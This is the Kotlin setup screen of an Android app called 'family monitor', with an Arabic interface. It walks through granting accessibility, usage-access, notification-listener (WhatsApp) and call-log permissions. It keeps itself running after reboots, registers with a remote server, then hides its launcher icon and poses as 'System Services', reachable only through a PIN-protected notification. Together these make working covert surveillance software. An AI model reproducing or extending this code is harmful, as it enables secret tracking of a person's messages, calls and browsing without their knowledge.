package com.family.monitor

import android.Manifest
import android.app.AppOpsManager
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.Menu
import android.view.MenuItem
import android.view.ViewGroup
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

/**
 * شاشة إعداد الجهاز الفرعي.
 * زر واحد يجلب كل الصلاحيات بالترتيب تلقائيًا، وبعد التسجيل تُخفى الأيقونة تلقائيًا
 * (والرجوع بالضغط على الإشعار الثابت «خدمات النظام» ← الرقم السري).
 */
class SetupActivity : AppCompatActivity() {

    private lateinit var etServer: EditText
    private lateinit var etCode: EditText
    private lateinit var etName: EditText
    private lateinit var statusView: TextView

    // خطوة معالج الصلاحيات الجارية: 0=الوصول، 1=الاستخدام، 2=الإشعارات (-1 = متوقف)
    private var wizardIndex = -1

    // خطوة مؤجلة: اعرض رسالة النجاح بعد الرجوع من حوار استثناء البطارية
    private var pendingSuccessDialog = false

    // خطوة مؤجلة: افتح إعدادات التشغيل التلقائي بعد الرجوع من حوار استثناء البطارية
    private var pendingAutostart = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val pad = (16 * resources.displayMetrics.density).toInt()
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(pad, pad * 2, pad, pad)
        }

        layout.addView(TextView(this).apply {
            text = "إعداد الجهاز الفرعي"
            textSize = 20f
            setPadding(0, pad, 0, pad / 2)
        })

        etServer = EditText(this).apply {
            hint = "عنوان الخادم (مثل: https://xxxx.vercel.app)"
            setText(Prefs.serverUrl(this@SetupActivity) ?: Config.DEFAULT_SERVER_URL)
        }
        etCode = EditText(this).apply {
            hint = "كود الاقتران (من إعدادات اللوحة)"
        }
        etName = EditText(this).apply {
            hint = "اسم الجهاز في اللوحة"
            setText(Prefs.deviceName(this@SetupActivity) ?: Build.MODEL ?: "هاتف أندرويد")
        }
        layout.addView(etServer)
        layout.addView(etCode)
        layout.addView(etName)

        // ===== زر واحد لكل الصلاحيات — معالج تلقائي خطوة بخطوة =====
        layout.addView(Button(this).apply {
            text = "منح كل الصلاحيات تلقائيًا (واحدة تلو الأخرى)"
            setOnClickListener { startPermissionWizard() }
        })

        // ===== خطوة التشغيل بعد إعادة تشغيل الهاتف (حتى تستمر المراقبة بعد الريستارت) =====
        layout.addView(Button(this).apply {
            text = "السماح بالتشغيل بعد إعادة تشغيل الهاتف (مهم)"
            setOnClickListener { requestBootReliability() }
        })

        layout.addView(Button(this).apply {
            text = "تسجيل الجهاز وبدء المراقبة (وإخفاء الأيقونة)"
            setOnClickListener { onRegisterClicked() }
        })

        statusView = TextView(this).apply {
            textSize = 14f
            setPadding(0, pad, 0, 0)
        }
        layout.addView(statusView)

        layout.addView(TextView(this).apply {
            text = "بعد التسجيل تُخفى الأيقونة تلقائيًا والمراقبة تستمر.\n" +
                "وبعد التسجيل سيطلب التطبيق «السماح بالعمل في الخلفية»\n" +
                "حتى تبدأ المراقبة تلقائيًا بعد أي إعادة تشغيل للهاتف.\n\n" +
                "للرجوع في أي وقت: اسحب شريط الإشعارات واضغط على إشعار\n" +
                "«خدمات النظام» الثابت\n" +
                "ثم أدخل الرقم السري (كود الاقتران) — ستظهر الأيقونة فورًا."
            textSize = 13f
            setPadding(0, pad * 2, 0, 0)
        })

        setContentView(ScrollView(this).apply {
            layoutParams = ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )
            addView(layout)
        })
        refreshStatus()

        // الصلاحيات العادية تُطلب بمربع حوار النظام مباشرة (بدون شاشات إعدادات)
        ActivityCompat.requestPermissions(
            this,
            arrayOf(Manifest.permission.READ_CALL_LOG, Manifest.permission.POST_NOTIFICATIONS),
            100
        )
    }

    // ---------- فحص كل صلاحية ----------

    private fun hasCallLog(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED

    private fun hasUsageAccess(): Boolean = try {
        val ops = getSystemService(APP_OPS_SERVICE) as AppOpsManager
        val mode = if (Build.VERSION.SDK_INT >= 29) ops.unsafeCheckOpNoThrow(
            AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
        else @Suppress("DEPRECATION") ops.checkOpNoThrow(
            AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
        mode == AppOpsManager.MODE_ALLOWED
    } catch (_: Exception) { false }

    private fun hasNotificationListener(): Boolean =
        androidx.core.app.NotificationManagerCompat.getEnabledListenerPackages(this).contains(packageName)

    /** هل التطبيق مستثنى من تحسينات البطارية (يسمح بالعمل المستمر وإعادة التشغيل التلقائي)؟ */
    private fun isIgnoringBatteryOpt(): Boolean {
        val pm = getSystemService(POWER_SERVICE) as android.os.PowerManager
        return pm.isIgnoringBatteryOptimizations(packageName)
    }

    private fun refreshStatus() {
        val registered = Prefs.apiKey(this) != null
        val accessibility = Api.isAccessibilityEnabled(this)
        val usage = hasUsageAccess()
        val notifications = hasNotificationListener()
        val callLog = hasCallLog()
        val hidden = Prefs.hideIcon(this)
        statusView.text = buildString {
            appendLine("حالة التسجيل: ${if (registered) "مسجل ✓" else "غير مسجل ✗"}")
            appendLine("رصد التصفح: ${if (accessibility) "✓" else "✗"} · فتح التطبيقات: ${if (usage) "✓" else "✗"}")
            appendLine("واتساب (الإشعارات): ${if (notifications) "✓" else "✗"} · المكالمات: ${if (callLog) "✓" else "✗"}")
            appendLine("التشغيل بعد إعادة التشغيل: ${if (isIgnoringBatteryOpt()) "جاهز ✓" else "يحتاج سماح ✗ — اضغط الزر أعلاه"}")
            appendLine("أيقونة التطبيق: ${if (hidden) "مخفية — الرجوع من إشعار «خدمات النظام» الثابت" else "ظاهرة ✓"}")
            append("أحداث في انتظار الإرسال: ${EventStore.pendingCount(this@SetupActivity)}")
        }
    }

    // ---------- معالج الصلاحيات التلقائي ----------

    private fun wizardChecks(): List<() -> Boolean> = listOf(
        { Api.isAccessibilityEnabled(this) },
        { hasUsageAccess() },
        { hasNotificationListener() }
    )

    private fun startPermissionWizard() {
        // الصلاحيات العادية أولًا (حوار مباشر من النظام)
        ActivityCompat.requestPermissions(
            this,
            arrayOf(Manifest.permission.READ_CALL_LOG, Manifest.permission.POST_NOTIFICATIONS),
            100
        )
        wizardIndex = -1
        openNextMissing(0)
    }

    private fun openNextMissing(from: Int) {
        val checks = wizardChecks()
        val hints = listOf(
            "١/٣ — فعّل «خدمات النظام» من قائمة خدمات الوصول ثم ارجع للتطبيق",
            "٢/٣ — فعّل «الوصول إلى بيانات الاستخدام» لهذا التطبيق ثم ارجع",
            "٣/٣ — فعّل «خدمات النظام» من قائمة الوصول إلى الإشعارات ثم ارجع"
        )
        val intents = listOf(
            Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS),
            Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS),
            Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
        )

        for (i in from until checks.size) {
            if (!checks[i]()) {
                wizardIndex = i
                Toast.makeText(this, hints[i], Toast.LENGTH_LONG).show()
                startActivity(intents[i])
                return
            }
        }
        wizardIndex = -1
        Toast.makeText(this, "كل الصلاحيات ممنوحة ✓", Toast.LENGTH_LONG).show()
        refreshStatus()
    }

    override fun onResume() {
        super.onResume()
        refreshStatus()
        // بعد الرجوع من حوار استثناء البطارية بعد التسجيل: اعرض رسالة النجاح
        if (pendingSuccessDialog) {
            pendingSuccessDialog = false
            showSuccessAndHide()
            return
        }
        // بعد الرجوع من حوار استثناء البطارية (زر يدوي): افتح إعدادات الشركة
        if (pendingAutostart) {
            pendingAutostart = false
            openAutostartSettings()
            return
        }
        // عند العودة من شاشة الإعدادات نكمل الخطوة التالية تلقائيًا
        if (wizardIndex >= 0) {
            val checks = wizardChecks()
            val i = wizardIndex
            wizardIndex = -1
            if (checks[i]()) {
                openNextMissing(i + 1)
            } else {
                Toast.makeText(this, "الصلاحية لم تُمنح — اضغط زر الصلاحيات مرة أخرى للمتابعة", Toast.LENGTH_LONG).show()
            }
        }
    }

    // ---------- التشغيل بعد إعادة تشغيل الهاتف ----------

    /**
     * خطوة واحدة تضمن استمرار المراقبة بعد إعادة تشغيل الهاتف:
     * 1) استثناء التطبيق من تحسينات البطارية (حوار نظام رسمي).
     * 2) فتح صفحة «التشغيل التلقائي» الخاصة بشركة الهاتف (شاومي/هواوي/أوبو...).
     */
    private fun requestBootReliability() {
        if (!isIgnoringBatteryOpt()) {
            pendingAutostart = true
            try {
                startActivity(
                    Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                        .setData(android.net.Uri.parse("package:$packageName"))
                )
                return
            } catch (_: Exception) {
                pendingAutostart = false
            }
        }
        openAutostartSettings()
    }

    /**
     * يفتح صفحة «التشغيل التلقائي» الخاصة بشركة الهاتف إن وُجدت.
     * بعض الواجهات (MIUI وEMUI وColorOS وFuntouchOS) تحجب بث إعادة التشغيل
     * عن التطبيق ما لم يفعّل المستخدم هذه القائمة مرة واحدة.
     */
    private fun openAutostartSettings() {
        val mfr = (Build.MANUFACTURER ?: "").lowercase()
        val candidates = mutableListOf<Intent>()

        if (mfr.contains("xiaomi") || mfr.contains("redmi") || mfr.contains("poco")) {
            candidates += Intent().setClassName(
                "com.miui.securitycenter",
                "com.miui.permcenter.autostart.AutoStartManagementActivity"
            )
        }
        if (mfr.contains("huawei") || mfr.contains("honor")) {
            candidates += Intent().setClassName(
                "com.huawei.systemmanager",
                "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"
            )
            candidates += Intent().setClassName(
                "com.huawei.systemmanager",
                "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity"
            )
        }
        if (mfr.contains("oppo") || mfr.contains("realme") || mfr.contains("oneplus")) {
            candidates += Intent().setClassName(
                "com.coloros.safecenter",
                "com.coloros.safecenter.permission.startup.StartupAppListActivity"
            )
            candidates += Intent().setClassName(
                "com.oppo.safe",
                "com.oppo.safe.permission.startup.StartupAppListActivity"
            )
        }
        if (mfr.contains("vivo")) {
            candidates += Intent().setClassName(
                "com.vivo.permissionmanager",
                "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"
            )
        }
        if (mfr.contains("samsung")) {
            candidates += Intent().setClassName(
                "com.samsung.android.sm.ui",
                "com.samsung.android.sm.ui.battery.BatteryActivity"
            )
        }

        for (i in candidates) {
            try {
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(i)
                Toast.makeText(
                    this,
                    "فعّل «التشغيل التلقائي / السماح بالعمل في الخلفية» لهذا التطبيق ثم ارجع",
                    Toast.LENGTH_LONG
                ).show()
                refreshStatus()
                return
            } catch (_: Exception) {}
        }
        // لم تُوجد صفحة خاصة بالشركة — افتح صفحة معلومات التطبيق
        try {
            startActivity(
                Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                    .setData(android.net.Uri.parse("package:$packageName"))
            )
            Toast.makeText(
                this,
                "من «البطارية» اختر: بدون قيود / السماح بالعمل في الخلفية",
                Toast.LENGTH_LONG
            ).show()
        } catch (_: Exception) {}
        refreshStatus()
    }

    // ---------- التسجيل + الإخفاء التلقائي ----------

    private fun onRegisterClicked() {
        val server = etServer.text.toString().trim()
        val code = etCode.text.toString().trim()
        val name = etName.text.toString().trim().ifBlank { Build.MODEL ?: "هاتف أندرويد" }

        if (!server.startsWith("http")) {
            Toast.makeText(this, "عنوان الخادم يجب أن يبدأ بـ http(s)://", Toast.LENGTH_LONG).show()
            return
        }
        if (code.length < 6) {
            Toast.makeText(this, "أدخل كود الاقتران من إعدادات اللوحة", Toast.LENGTH_LONG).show()
            return
        }

        Toast.makeText(this, "جارٍ التسجيل...", Toast.LENGTH_SHORT).show()
        Thread {
            val apiKey = Api.register(server, code, name)
            runOnUiThread {
                if (apiKey != null) {
                    Prefs.save(this, server, apiKey, name)
                    Prefs.setActivated(this, true)
                    Prefs.setPairingCode(this, code) // كلمة مرور فتح التطبيق بعد الإخفاء
                    // تشغيل خدمة المراقبة مباشرة بعد التسجيل
                    BootReceiver.startMonitor(this@SetupActivity)
                    // جدولة الفحص الاحتياطي الدوري (يستمر بعد إعادة تشغيل الجهاز أيضًا)
                    Watchdog.schedule(this@SetupActivity)

                    // خطوة التشغيل بعد إعادة التشغيل — تُطلب تلقائيًا الآن
                    if (!isIgnoringBatteryOpt()) {
                        pendingSuccessDialog = true
                        try {
                            startActivity(
                                Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                                    .setData(android.net.Uri.parse("package:$packageName"))
                            )
                            return@runOnUiThread
                        } catch (_: Exception) {
                            pendingSuccessDialog = false
                        }
                    }
                    showSuccessAndHide()
                } else {
                    Toast.makeText(this, "فشل التسجيل: تحقق من العنوان والكود", Toast.LENGTH_LONG).show()
                }
            }
        }.start()
    }

    /** رسالة النجاح ثم الإخفاء التلقائي للأيقونة */
    private fun showSuccessAndHide() {
        AlertDialog.Builder(this)
            .setTitle("تم التسجيل بنجاح ✓")
            .setMessage(
                "ستُخفى أيقونة التطبيق الآن والمراقبة تعمل في الخلفية.\n\n" +
                    "استمرار المراقبة بعد إعادة تشغيل الهاتف:\n" +
                    "التطبيق سيعمل تلقائيًا بعد أي ريستارت بفضل مستقبِل التشغيل\n" +
                    "والفحص الاحتياطي الدوري (المطلوب فقط: السماح بالعمل في الخلفية).\n\n" +
                    "للرجوع في أي وقت:\n" +
                    "اسحب شريط الإشعارات واضغط على إشعار «خدمات النظام» الثابت،\n" +
                    "ثم أدخل الرقم السري (كود الاقتران: ${Prefs.pairingCode(this)}) وستظهر الأيقونة فورًا."
            )
            .setCancelable(false)
            .setPositiveButton("حسنًا — أخفِ الأيقونة") { _, _ ->
                Prefs.setLauncherIconHidden(this@SetupActivity, true)
                startActivity(Intent(this@SetupActivity, StealthActivity::class.java))
                finish()
            }
            .show()
    }

    // ---------- القائمة (⋮) ----------

    override fun onCreateOptionsMenu(menu: Menu): Boolean {
        menu.add(0, 1, 0, "تغيير نوع الجهاز")
        menu.add(0, 2, 0, if (Prefs.hideIcon(this)) "إظهار أيقونة التطبيق" else "إخفاء أيقونة التطبيق")
        return true
    }

    override fun onOptionsItemSelected(item: MenuItem): Boolean {
        return when (item.itemId) {
            1 -> {
                Prefs.clearRole(this)
                startActivity(Intent(this, MainActivity::class.java))
                finish()
                true
            }
            2 -> {
                val willHide = !Prefs.hideIcon(this)
                if (willHide && Prefs.apiKey(this) == null) {
                    Toast.makeText(this, "سجّل الجهاز أولًا قبل الإخفاء", Toast.LENGTH_LONG).show()
                    return true
                }
                AlertDialog.Builder(this)
                    .setTitle(if (willHide) "إخفاء الأيقونة" else "إظهار الأيقونة")
                    .setMessage(
                        if (willHide)
                            "ستختفي الأيقونة والمراقبة تستمر طبيعيًا.\n\nللرجوع: اسحب شريط الإشعارات واضغط على إشعار «خدمات النظام» الثابت، ثم أدخل الرقم السري (كود الاقتران)."
                        else "ستعود الأيقونة إلى الشاشة الرئيسية فورًا."
                    )
                    .setPositiveButton("تأكيد") { _, _ ->
                        Prefs.setLauncherIconHidden(this, willHide)
                        Toast.makeText(this, if (willHide) "تم الإخفاء ✓" else "تم الإظهار ✓", Toast.LENGTH_LONG).show()
                        invalidateOptionsMenu()
                        refreshStatus()
                        if (willHide) finish()
                    }
                    .setNegativeButton("إلغاء", null)
                    .show()
                true
            }
            else -> super.onOptionsItemSelected(item)
        }
    }
}
